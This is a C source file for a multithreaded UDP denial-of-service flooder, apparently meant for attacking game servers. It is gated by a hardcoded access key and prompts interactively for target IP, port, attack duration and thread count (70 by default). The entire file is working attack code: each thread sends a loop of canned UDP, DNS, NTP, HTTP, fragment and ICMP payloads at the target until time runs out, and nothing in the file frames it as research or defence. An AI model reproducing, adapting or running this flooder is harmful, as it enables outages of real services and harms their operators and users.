#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>

#define DEFAULT_THREADS 70
#define EXPIRATION_YEAR 2024
#define EXPIRATION_MONTH 12
#define EXPIRATION_DAY 31
#define ACCESS_KEY "VIP-AGEON"

// Structure for attack data
struct thread_data {
    char *ip;
    int port;
    int time;
};

// Function to handle the attack logic
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    int packet_count = 0;

    // Define a set of payloads for different protocols
    char *payloads[] = {
        // Long UDP packet full of random data
        "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
        "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
        "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
        "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
        "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
        "\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff",

        // Large DNS packet
        "\x35\x12\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x03\x77\x77\x77"
        "\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"
        "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04\xd8\x3a\xc5\xe0",

        // NTP payload
        "\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00",

        // HTTP GET request
        "GET / HTTP/1.1\r\nHost: targetserver\r\nUser-Agent: Mozilla/5.0\r\n"
        "Accept: text/html,application/xhtml+xml\r\n"
        "Connection: keep-alive\r\n\r\n",

        // Large fragmented packet (to simulate fragmentation attacks)
        "\x45\x00\x00\x28\x6f\x22\x40\x00\x40\x06\xb1\xe6\xc0\xa8\x00\x68"
        "\xc0\xa8\x00\x01\x04\x00\x1f\x40\x00\x00\x00\x00\x50\x02\x20\x00"
        "\xe8\x32\x00\x00",

        // ICMP (ping) packet with large payload
        "\x08\x00\xf7\xff\x00\x01\x00\x01"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70\x71\x72\x73\x74\x75\x76"
        "\x77\x78\x79\x7a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70\x71\x72"
        "\x73\x74\x75\x76\x77\x78\x79\x7a\x61\x62\x63\x64\x65\x66\x67\x68"
        "\x69\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a",

        // Custom DNS-like payload (large)
        "\x12\x34\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x03\x77\x77\x77"
        "\x07\x65\x78\x61\x6d\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00"
        "\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04\xc0\xa8\x00"
        "\x01",

        // Random UDP data
        "\x50\x60\x70\x80\x90\xa0\xb0\xc0\xd0\xe0\xf0\x11\x22\x33\x44\x55"
        "\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff\xff\xee\xdd\xcc\xbb\xaa"
        "\x99\x88\x77\x66\x55\x44\x33\x22\x11\x00"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
            packet_count++;  // Track how many packets are sent
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Command usage help
void usage() {
    printf("Usage:\n");
    printf("  ./bgmi                - Run the program and provide the access key interactively\n");
    exit(1);
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 1) {
        usage();
    }

    // Ask for the access key interactively
    char access_key[50];
    printf("Enter access key: ");
    scanf("%s", access_key);

    if (strcmp(access_key, ACCESS_KEY) != 0) {
        printf("Error: Invalid access key. Access denied.\n");
        exit(1);
    }

    // Ask for IP, port, and time interactively
    char ip[20];
    int port, time, threads = DEFAULT_THREADS;

    printf("Enter target IP address: ");
    scanf("%s", ip);
    
    printf("Enter target port: ");
    scanf("%d", &port);
    
    printf("Enter duration of attack in seconds: ");
    scanf("%d", &time);

    // Ask for the number of threads (optional)
    char use_default_threads;
    printf("Use default number of threads (70)? (y/n): ");
    scanf(" %c", &use_default_threads);
    
    if (use_default_threads == 'n' || use_default_threads == 'N') {
        printf("Enter number of threads: ");
        scanf("%d", &threads);
    }

    // Launch the attack
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("\nAttack finished\n");
    return 0;
}
